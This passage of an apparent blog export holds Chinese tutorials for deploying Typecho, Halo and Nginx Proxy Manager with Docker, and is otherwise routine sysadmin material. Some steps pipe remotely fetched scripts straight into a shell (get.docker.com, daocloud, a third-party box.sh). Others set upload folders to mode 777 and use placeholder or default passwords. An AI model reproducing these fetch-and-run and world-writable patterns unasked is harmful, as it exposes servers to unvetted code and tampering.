<h1 id="复制粘贴数据库环境信息"><a href="#复制粘贴数据库环境信息" class="headerlink" title="复制粘贴数据库环境信息"></a>复制粘贴数据库环境信息</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MYSQL_ROOT_PASSWORD=root_pass</span><br><span class="line">MYSQL_DATABASE=typecho</span><br><span class="line">MYSQL_USER=username</span><br><span class="line">MYSQL_PASSWORD=password</span><br></pre></td></tr></table></figure>

<h1 id="创建php文件夹和Dockerfile"><a href="#创建php文件夹和Dockerfile" class="headerlink" title="创建php文件夹和Dockerfile"></a>创建php文件夹和Dockerfile</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/data/docker_data/typecho</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> php</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> php</span><br><span class="line"></span><br><span class="line">nano Dockerfile</span><br></pre></td></tr></table></figure>

<h1 id="复制粘贴下面代码到Dockerfile"><a href="#复制粘贴下面代码到Dockerfile" class="headerlink" title="复制粘贴下面代码到Dockerfile"></a>复制粘贴下面代码到Dockerfile</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM php:7.3.29-fpm</span><br><span class="line">RUN apt-get update \</span><br><span class="line">    &amp;&amp; docker-php-ext-install pdo_mysql \</span><br><span class="line">    &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;output_buffering = 4096&quot;</span> &gt; /usr/local/etc/php/conf.d/php.ini \</span><br><span class="line">    &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;date.timezone = PRC&quot;</span> &gt;&gt; /usr/local/etc/php/conf.d/php.ini</span><br></pre></td></tr></table></figure>

<h1 id="创建nginx文件夹和反代配置default-conf"><a href="#创建nginx文件夹和反代配置default-conf" class="headerlink" title="创建nginx文件夹和反代配置default.conf"></a>创建nginx文件夹和反代配置default.conf</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/data/docker_data/typecho</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> nginx</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> nginx</span><br><span class="line"></span><br><span class="line">nano default.conf</span><br></pre></td></tr></table></figure>

<h1 id="复制粘贴如下反代配置"><a href="#复制粘贴如下反代配置" class="headerlink" title="复制粘贴如下反代配置"></a>复制粘贴如下反代配置</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80 default_server;</span><br><span class="line">    root /var/www/html;</span><br><span class="line">    index index.php;</span><br><span class="line"></span><br><span class="line">    access_log /var/log/nginx/typecho_access.log main;</span><br><span class="line">    <span class="keyword">if</span> (!-e <span class="variable">$request_filename</span>) &#123;</span><br><span class="line">        rewrite ^(.*)$ /index.php<span class="variable">$1</span> last;</span><br><span class="line">    &#125;</span><br><span class="line">    location / &#123;</span><br><span class="line">        index index.html index.htm index.php;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!-e <span class="variable">$request_filename</span>) &#123;</span><br><span class="line">            rewrite . /index.php last;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~ \.php(.*)$ &#123;</span><br><span class="line">        fastcgi_pass   php:9000;</span><br><span class="line">        fastcgi_index  index.php;</span><br><span class="line">        fastcgi_param  PATH_TRANSLATED $document_root<span class="variable">$fastcgi_path_info</span>;</span><br><span class="line">        fastcgi_split_path_info  ^((?U).+\.php)(/?.+)$;</span><br><span class="line">        fastcgi_param  PATH_INFO  <span class="variable">$fastcgi_path_info</span>;</span><br><span class="line">        fastcgi_param  SCRIPT_NAME <span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">        fastcgi_param  SCRIPT_FILENAME $document_root<span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">        include        fastcgi_params;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="下载typecho源代码（暂时最新版本1-2-0）"><a href="#下载typecho源代码（暂时最新版本1-2-0）" class="headerlink" title="下载typecho源代码（暂时最新版本1.2.0）"></a>下载typecho源代码（暂时最新版本1.2.0）</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#再新建一个typecho文件夹</span></span><br><span class="line"><span class="built_in">mkdir</span> typecho</span><br><span class="line"><span class="built_in">cd</span> /root/data/docker_data/typecho/typecho</span><br><span class="line"><span class="comment">#下载typecho.zip安装包</span></span><br><span class="line">wget https://github.com/typecho/typecho/releases/download/v1.2.0/typecho.zip</span><br><span class="line"><span class="comment">#安装zip</span></span><br><span class="line">apt install zip -y </span><br><span class="line"><span class="comment">#解压缩</span></span><br><span class="line">unzip typecho.zip</span><br></pre></td></tr></table></figure>

<h1 id="对uploads及其下文件授权，或者对usr及其下文件授权"><a href="#对uploads及其下文件授权，或者对usr及其下文件授权" class="headerlink" title="对uploads及其下文件授权，或者对usr及其下文件授权"></a>对uploads及其下文件授权，或者对usr及其下文件授权</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> -R 777 uploads</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> -R 777 usr</span><br></pre></td></tr></table></figure>

<h1 id="创建docker-compose-yml文件"><a href="#创建docker-compose-yml文件" class="headerlink" title="创建docker-compose.yml文件"></a>创建docker-compose.yml文件</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/data/docker_data/typecho</span><br><span class="line"></span><br><span class="line">nano docker-compose.yml</span><br></pre></td></tr></table></figure>

<h1 id="复制粘贴如下代码到docker-compose-yml"><a href="#复制粘贴如下代码到docker-compose-yml" class="headerlink" title="复制粘贴如下代码到docker-compose.yml"></a>复制粘贴如下代码到docker-compose.yml</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">version: <span class="string">&quot;3&quot;</span></span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  nginx:</span><br><span class="line">    image: nginx</span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;8223:80&quot;</span>    <span class="comment"># 左边可以改成任意没使用的端口</span></span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      - TZ=Asia/Shanghai</span><br><span class="line">    volumes:</span><br><span class="line">      - ./typecho:/var/www/html</span><br><span class="line">      - ./nginx:/etc/nginx/conf.d</span><br><span class="line">      - ./logs:/var/log/nginx</span><br><span class="line">    depends_on:</span><br><span class="line">      - php</span><br><span class="line">    networks:</span><br><span class="line">      - web</span><br><span class="line"></span><br><span class="line">  php:</span><br><span class="line">    build: php</span><br><span class="line">    restart: always</span><br><span class="line">    expose:</span><br><span class="line">      - <span class="string">&quot;9000&quot;</span>       <span class="comment"># 不暴露公网，故没有写9000:9000</span></span><br><span class="line">    volumes:</span><br><span class="line">      - ./typecho:/var/www/html</span><br><span class="line">    environment:</span><br><span class="line">      - TZ=Asia/Shanghai</span><br><span class="line">    depends_on:</span><br><span class="line">      - mysql</span><br><span class="line">    networks:</span><br><span class="line">      - web</span><br><span class="line"></span><br><span class="line">  mysql:</span><br><span class="line">    image: mysql:5.7</span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      - TZ=Asia/Shanghai</span><br><span class="line">    expose:</span><br><span class="line">      - <span class="string">&quot;3306&quot;</span>  <span class="comment"># 不暴露公网，故没有写3306:3306</span></span><br><span class="line">    volumes:</span><br><span class="line">      - ./mysql/data:/var/lib/mysql</span><br><span class="line">      - ./mysql/logs:/var/log/mysql</span><br><span class="line">      - ./mysql/conf:/etc/mysql/conf.d</span><br><span class="line">    env_file:</span><br><span class="line">      - mysql.env</span><br><span class="line">    networks:</span><br><span class="line">      - web</span><br><span class="line"></span><br><span class="line">networks:</span><br><span class="line">  web:</span><br></pre></td></tr></table></figure>

<p>ctrl+o保存，ctrl+x退出，按y保存，enter确认</p>
<h1 id="查看端口是否被占用"><a href="#查看端口是否被占用" class="headerlink" title="查看端口是否被占用"></a>查看端口是否被占用</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsof -i:8223  <span class="comment">#查看8223端口是否被占用，如果被占用，重新自定义一个端口</span></span><br></pre></td></tr></table></figure>

<p>如果出现：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-bash: lsof: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure>

<p>运行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install lsof  <span class="comment">#安装lsof</span></span><br></pre></td></tr></table></figure>

<h1 id="如果端口没有被占用，可以启动docker-compose"><a href="#如果端口没有被占用，可以启动docker-compose" class="headerlink" title="如果端口没有被占用，可以启动docker-compose"></a>如果端口没有被占用，可以启动docker-compose</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up -d </span><br></pre></td></tr></table></figure>

<h1 id="访问typecho后台-0-0-0-0-8223-admin"><a href="#访问typecho后台-0-0-0-0-8223-admin" class="headerlink" title="访问typecho后台: 0.0.0.0:8223&#x2F;admin"></a>访问typecho后台: 0.0.0.0:8223&#x2F;admin</h1><p>数据库地址：mysql<br>数据库用户名：username<br>数据库密码：password<br>数据库名：typecho</p>
<p>在&#x2F;root&#x2F;data&#x2F;docker_data&#x2F;typecho&#x2F;typecho<br>创建 touch config.inc.php</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// site root path</span><br><span class="line">define(<span class="string">&#x27;__TYPECHO_ROOT_DIR__&#x27;</span>, <span class="built_in">dirname</span>(__FILE__));</span><br><span class="line"></span><br><span class="line">// plugin directory (relative path)</span><br><span class="line">define(<span class="string">&#x27;__TYPECHO_PLUGIN_DIR__&#x27;</span>, <span class="string">&#x27;/usr/plugins&#x27;</span>);</span><br><span class="line"></span><br><span class="line">// theme directory (relative path)</span><br><span class="line">define(<span class="string">&#x27;__TYPECHO_THEME_DIR__&#x27;</span>, <span class="string">&#x27;/usr/themes&#x27;</span>);</span><br><span class="line"></span><br><span class="line">// admin directory (relative path)</span><br><span class="line">define(<span class="string">&#x27;__TYPECHO_ADMIN_DIR__&#x27;</span>, <span class="string">&#x27;/admin/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">// register <span class="built_in">autoload</span></span><br><span class="line">require_once __TYPECHO_ROOT_DIR__ . <span class="string">&#x27;/var/Typecho/Common.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">// init</span><br><span class="line">\Typecho\Common::init();</span><br><span class="line"></span><br><span class="line">// config db</span><br><span class="line"><span class="variable">$db</span> = new \Typecho\Db(<span class="string">&#x27;Pdo_Mysql&#x27;</span>, <span class="string">&#x27;typecho_&#x27;</span>);</span><br><span class="line"><span class="variable">$db</span>-&gt;addServer(array (</span><br><span class="line">  <span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;port&#x27;</span> =&gt; 3306,</span><br><span class="line">  <span class="string">&#x27;user&#x27;</span> =&gt; <span class="string">&#x27;username&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;password&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;charset&#x27;</span> =&gt; <span class="string">&#x27;utf8mb4&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;database&#x27;</span> =&gt; <span class="string">&#x27;typecho&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;engine&#x27;</span> =&gt; <span class="string">&#x27;InnoDB&#x27;</span>,</span><br><span class="line">), \Typecho\Db::READ | \Typecho\Db::WRITE);</span><br><span class="line">\Typecho\Db::<span class="built_in">set</span>(<span class="variable">$db</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>文章内容和代码来源于网络，如有侵权请联系站长立即删除。</p>
]]></content>
      <categories>
        <category>web</category>
        <category>typecho</category>
        <category>docker</category>
        <category>typecho</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>web</tag>
        <tag>docker</tag>
        <tag>typecho</tag>
      </tags>
  </entry>
  <entry>
    <title>docker 搭建 halo（版本:1.6.1）</title>
    <url>/posts/bb347a52/</url>
    <content><![CDATA[<p>halo官网：<a href="https://docs.halo.run/">https://docs.halo.run/</a><br>halo社区：<a href="https://bbs.halo.run/">https://bbs.halo.run/</a></p>
<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 切换到root用户</span><br><span class="line">sudo -i </span><br><span class="line"># 升级packages</span><br><span class="line"># Debian系统比较干净，安装常用的软件</span><br><span class="line">apt update -y  </span><br><span class="line">apt install wget curl sudo vim git  </span><br></pre></td></tr></table></figure>

<h1 id="1-创建halo项目文件夹"><a href="#1-创建halo项目文件夹" class="headerlink" title="1.创建halo项目文件夹"></a>1.创建halo项目文件夹</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> ~/.halo &amp;&amp; <span class="built_in">cd</span> ~/.halo</span><br></pre></td></tr></table></figure>

<h1 id="2-下载示例配置文件到-工作目录"><a href="#2-下载示例配置文件到-工作目录" class="headerlink" title="2.下载示例配置文件到 工作目录"></a>2.下载示例配置文件到 工作目录</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://dl.halo.run/config/application-template.yaml -O ./application.yaml</span><br></pre></td></tr></table></figure>

<h1 id="3-编辑配置文件，配置数据库或者端口等，如需配置请参考-配置参考"><a href="#3-编辑配置文件，配置数据库或者端口等，如需配置请参考-配置参考" class="headerlink" title="3.编辑配置文件，配置数据库或者端口等，如需配置请参考 配置参考"></a>3.编辑配置文件，配置数据库或者端口等，如需配置请参考 配置参考</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim application.yaml</span><br></pre></td></tr></table></figure>

<h1 id="4-拉取最新的-Halo-镜像"><a href="#4-拉取最新的-Halo-镜像" class="headerlink" title="4.拉取最新的 Halo 镜像"></a>4.拉取最新的 Halo 镜像</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull halohub/halo:1.6.1</span><br></pre></td></tr></table></figure>

<h1 id="5-创建容器"><a href="#5-创建容器" class="headerlink" title="5.创建容器"></a>5.创建容器</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it -d --name halo -p 8090:8090 -v ~/.halo:/root/.halo --restart=unless-stopped halohub/halo:1.6.1</span><br></pre></td></tr></table></figure>
<p>halo后台 0.0.0.0:8090&#x2F;admin</p>
<h1 id="6-更新"><a href="#6-更新" class="headerlink" title="6.更新"></a>6.更新</h1><h2 id="6-1-停止并删除当前运行中的容器"><a href="#6-1-停止并删除当前运行中的容器" class="headerlink" title="6.1.停止并删除当前运行中的容器"></a>6.1.停止并删除当前运行中的容器</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker stop halo</span><br><span class="line">docker <span class="built_in">rm</span> -f halo</span><br></pre></td></tr></table></figure>
<p>你的容器名称不一定为 halo，在执行前可以先执行 docker ps -a 查看一下。</p>
<h2 id="6-2-备份数据（重要）"><a href="#6-2-备份数据（重要）" class="headerlink" title="6.2.备份数据（重要）"></a>6.2.备份数据（重要）</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> -r ~/.halo ~/.halo.archive</span><br></pre></td></tr></table></figure>
<p>需要注意的是，.halo.archive 文件名不一定要根据此文档命名，这里仅仅是个示例。</p>
<h2 id="6-3-清空-leveldb-缓存（如果有使用-leveldb-作为缓存策略）"><a href="#6-3-清空-leveldb-缓存（如果有使用-leveldb-作为缓存策略）" class="headerlink" title="6.3.清空 leveldb 缓存（如果有使用 leveldb 作为缓存策略）"></a>6.3.清空 leveldb 缓存（如果有使用 leveldb 作为缓存策略）</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf ~/.halo/.leveldb</span><br></pre></td></tr></table></figure>
<h2 id="6-4-拉取最新的-Halo-镜像"><a href="#6-4-拉取最新的-Halo-镜像" class="headerlink" title="6.4.拉取最新的 Halo 镜像"></a>6.4.拉取最新的 Halo 镜像</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull halohub/halo:1.6.1</span><br></pre></td></tr></table></figure>
<p>查看最新版本镜像：<a href="https://hub.docker.com/r/halohub/halo">https://hub.docker.com/r/halohub/halo</a> ，我们推荐使用具体版本号的镜像，但也提供了 latest 标签的镜像，它始终是最新的。</p>
<h2 id="6-5-创建容器"><a href="#6-5-创建容器" class="headerlink" title="6.5.创建容器"></a>6.5.创建容器</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it -d --name halo -p 8090:8090 -v ~/.halo:/root/.halo --restart=unless-stopped halohub/halo:1.6.1</span><br></pre></td></tr></table></figure>
<p>-it： 开启输入功能并连接伪终端<br>-d： 后台运行容器<br>–name： 为容器指定一个名称<br>-p： 端口映射，格式为 主机(宿主)端口:容器端口 ，可在 application.yaml 配置。<br>-v： 工作目录映射。形式为：-v 宿主机路径:&#x2F;root&#x2F;.halo，后者不能修改。<br>–restart： 建议设置为 unless-stopped，在 Docker 启动的时候自动启动 Halo 容器。</p>
<h1 id="7-卸载"><a href="#7-卸载" class="headerlink" title="7. 卸载"></a>7. 卸载</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -i  <span class="comment"># 切换到root</span></span><br><span class="line"></span><br><span class="line">docker stop halo</span><br><span class="line"></span><br><span class="line">docker <span class="built_in">rm</span> -f halo</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf ~/.halo     <span class="comment"># 完全删除映射到本地的数据</span></span><br></pre></td></tr></table></figure>

<p>文章内容和代码来源于网络，如有侵权请联系站长立即删除。</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>web</category>
        <category>docker</category>
        <category>halo</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>web</tag>
        <tag>docker</tag>
        <tag>halo</tag>
      </tags>
  </entry>
  <entry>
    <title>docker-compose 搭建 nginx proxy manager</title>
    <url>/posts/3ecd216c/</url>
    <content><![CDATA[<p>官网：<a href="https://nginxproxymanager.com/">https://nginxproxymanager.com/</a><br>docker官网：<a href="https://www.docker.com/">https://www.docker.com/</a><br>docker-compose安装：<a href="https://docs.docker.com/desktop/install/linux-install/">https://docs.docker.com/desktop/install/linux-install/</a></p>
<p>NginxProxyManager&#x2F;nginx-proxy-manager项目地址：<br><a href="https://github.com/NginxProxyManager/nginx-proxy-manager">https://github.com/NginxProxyManager/nginx-proxy-manager</a></p>
<p>xiaoxinpro&#x2F;nginx-proxy-manager-zh汉化项目地址：<br><a href="https://github.com/xiaoxinpro/nginx-proxy-manager-zh">https://github.com/xiaoxinpro/nginx-proxy-manager-zh</a></p>
<h1 id="添加SWAP虚拟内存（可选）"><a href="#添加SWAP虚拟内存（可选）" class="headerlink" title="添加SWAP虚拟内存（可选）"></a>添加SWAP虚拟内存（可选）</h1><p>注意：VPS 的内存如果过小，建议设置一下 SWAP，一般为内存的 1-2 倍即可（1024-2048），可以让系统运行更流畅！<br>设置 SWAP 可以用脚本:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -O box.sh https://raw.githubusercontent.com/BlueSkyXN/SKY-BOX/main/box.sh &amp;&amp; <span class="built_in">chmod</span> +x box.sh &amp;&amp; clear &amp;&amp; ./box.sh</span><br></pre></td></tr></table></figure>

<h1 id="升级-packages"><a href="#升级-packages" class="headerlink" title="升级 packages"></a>升级 packages</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -i <span class="comment"># 切换到 root 用户</span></span><br><span class="line"></span><br><span class="line">apt update -y  <span class="comment"># 升级 packages</span></span><br><span class="line"></span><br><span class="line">apt install wget curl sudo vim git -y  <span class="comment"># Debian 系统比较干净，安装常用的软件</span></span><br></pre></td></tr></table></figure>

<h1 id="安装-Docker-环境"><a href="#安装-Docker-环境" class="headerlink" title="安装 Docker 环境"></a>安装 Docker 环境</h1><p>安装 Docker（非大陆服务器）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -qO- get.docker.com | bash</span><br><span class="line"></span><br><span class="line">docker -v  <span class="comment">#查看 docker 版本</span></span><br><span class="line"></span><br><span class="line">systemctl <span class="built_in">enable</span> docker  <span class="comment"># 设置开机自动启动</span></span><br></pre></td></tr></table></figure>
<p>安装 Docker（国内服务器）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -sSL https://get.daocloud.io/docker | sh</span><br><span class="line"></span><br><span class="line">docker -v  <span class="comment">#查看 docker 版本</span></span><br><span class="line"></span><br><span class="line">systemctl <span class="built_in">enable</span> docker  <span class="comment"># 设置开机自动启动</span></span><br></pre></td></tr></table></figure>

<h1 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#https://github.com/docker/compose/releases 要安装其他版本的 Compose，请替换2.32.2</span></span><br><span class="line"></span><br><span class="line">sudo curl -L <span class="string">&quot;https://github.com/docker/compose/releases/download/2.32.2/docker-compose-<span class="subst">$(uname -s)</span>-<span class="subst">$(uname -m)</span>&quot;</span> -o /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line">curl -L https://github.com/docker/compose/releases/latest/download/docker-compose-Linux-x86_64 &gt; /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>


<h1 id="添加可执行权限-x"><a href="#添加可执行权限-x" class="headerlink" title="添加可执行权限:x"></a>添加可执行权限:x</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">chmod</span> +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>

<h1 id="在-usr-bin-路径下创建软连接"><a href="#在-usr-bin-路径下创建软连接" class="headerlink" title="在&#x2F;usr&#x2F;bin&#x2F;路径下创建软连接"></a>在&#x2F;usr&#x2F;bin&#x2F;路径下创建软连接</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /usr/local/bin/docker-compose /usr/bin/docker-compose</span><br></pre></td></tr></table></figure>

<h1 id="查看docker-compose版本"><a href="#查看docker-compose版本" class="headerlink" title="查看docker-compose版本"></a>查看docker-compose版本</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure>

<h1 id="安装-Nginx-Proxy-Manager"><a href="#安装-Nginx-Proxy-Manager" class="headerlink" title="安装 Nginx Proxy Manager"></a>安装 Nginx Proxy Manager</h1><p>创建安装目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -i</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p /root/data/docker_data/npm</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /root/data/docker_data/npm</span><br></pre></td></tr></table></figure>

<h1 id="这边我们直接用-docker-的方式安装"><a href="#这边我们直接用-docker-的方式安装" class="headerlink" title="这边我们直接用 docker 的方式安装"></a>这边我们直接用 docker 的方式安装</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim docker-compose.yml</span><br></pre></td></tr></table></figure>
<h1 id="配置docker-compose如下，监听80和443端口，81端口进后台"><a href="#配置docker-compose如下，监听80和443端口，81端口进后台" class="headerlink" title="配置docker-compose如下，监听80和443端口，81端口进后台"></a>配置docker-compose如下，监听80和443端口，81端口进后台</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">version: <span class="string">&#x27;3.8&#x27;</span></span><br><span class="line">services:</span><br><span class="line">  app:</span><br><span class="line">    image: <span class="string">&#x27;jc21/nginx-proxy-manager:latest&#x27;</span></span><br><span class="line">    restart: unless-stopped</span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&#x27;80:80&#x27;</span></span><br><span class="line">      - <span class="string">&#x27;81:81&#x27;</span></span><br><span class="line">      - <span class="string">&#x27;443:443&#x27;</span></span><br><span class="line">    volumes:</span><br><span class="line">      - ./data:/data</span><br><span class="line">      - ./letsencrypt:/etc/letsencrypt</span><br></pre></td></tr></table></figure>
<p>启动docker-compose</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/data/docker_data/npm   <span class="comment"># 来到 docker-compose 文件所在的文件夹下</span></span><br><span class="line"></span><br><span class="line">docker-compose up -d </span><br></pre></td></tr></table></figure>

<h1 id="启动docker-compose"><a href="#启动docker-compose" class="headerlink" title="启动docker-compose"></a>启动docker-compose</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up -d </span><br></pre></td></tr></table></figure>

<h1 id="默认登陆名和密码"><a href="#默认登陆名和密码" class="headerlink" title="默认登陆名和密码"></a>默认登陆名和密码</h1><p>Email:<a href="mailto:&#x61;&#x64;&#x6d;&#105;&#x6e;&#64;&#101;&#x78;&#97;&#109;&#x70;&#x6c;&#x65;&#x2e;&#99;&#x6f;&#109;">&#x61;&#x64;&#x6d;&#105;&#x6e;&#64;&#101;&#x78;&#97;&#109;&#x70;&#x6c;&#x65;&#x2e;&#99;&#x6f;&#109;</a><br>Password:changeme</p>
<h1 id="查看当前服务器IP"><a href="#查看当前服务器IP" class="headerlink" title="查看当前服务器IP"></a>查看当前服务器IP</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl ifconfig.me</span><br></pre></td></tr></table></figure>

<h1 id="查看Docker容器内部IP："><a href="#查看Docker容器内部IP：" class="headerlink" title="查看Docker容器内部IP："></a>查看Docker容器内部IP：</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip addr show docker0</span><br></pre></td></tr></table></figure>
<p>Docker内部IP默认172.17.0.1</p>
<p>nginx proxy manager后台 0.0.0.0:81</p>
<h1 id="更新-Nginx-Proxy-Manager"><a href="#更新-Nginx-Proxy-Manager" class="headerlink" title="更新 Nginx Proxy Manager"></a>更新 Nginx Proxy Manager</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/data/docker_data/npm</span><br><span class="line"></span><br><span class="line">docker-compose down </span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> -r /root/data/docker_data/npm /root/data/docker_data/npm.archive  <span class="comment"># 万事先备份，以防万一</span></span><br><span class="line"></span><br><span class="line">docker-compose pull</span><br><span class="line"></span><br><span class="line">docker-compose up -d    <span class="comment"># 请不要使用 docker-compose stop 来停止容器，因为这么做需要额外的时间等待容器停止；docker-compose up -d 直接升级容器时会自动停止并立刻重建新的容器，完全没有必要浪费那些时间。</span></span><br><span class="line"></span><br><span class="line">docker image prune  <span class="comment"># prune 命令用来删除不再使用的 docker 对象。删除所有未被 tag 标记和未被容器使用的镜像</span></span><br></pre></td></tr></table></figure>

<p>提示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">WARNING! This will remove all dangling images.</span><br><span class="line">Are you sure you want to <span class="built_in">continue</span>? [y/N] </span><br></pre></td></tr></table></figure>

<h1 id="卸载-Nginx-Proxy-Manager"><a href="#卸载-Nginx-Proxy-Manager" class="headerlink" title="卸载 Nginx Proxy Manager"></a>卸载 Nginx Proxy Manager</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/data/docker_data/npm</span><br><span class="line"></span><br><span class="line">docker-compose down </span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf /root/data/docker_data/npm  <span class="comment"># 完全删除映射到本地的数据</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="另附原版Nginx命令（与本篇NPM无关）"><a href="#另附原版Nginx命令（与本篇NPM无关）" class="headerlink" title="另附原版Nginx命令（与本篇NPM无关）"></a>另附原版Nginx命令（与本篇NPM无关）</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 重载&amp;重启Nginx</span></span><br><span class="line">sudo systemctl reload nginx &amp; sudo nginx -s reload</span><br><span class="line">sudo systemctl restart nginx &amp; sudo service nginx restart</span><br><span class="line"></span><br><span class="line"><span class="comment"># Nginx配置检查</span></span><br><span class="line">sudo nginx -t</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>tools</category>
        <category>web</category>
        <category>docker</category>
        <category>nginx</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>web</tag>
        <tag>docker</tag>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>excel常用函数</title>
    <url>/posts/c44c31f4/</url>
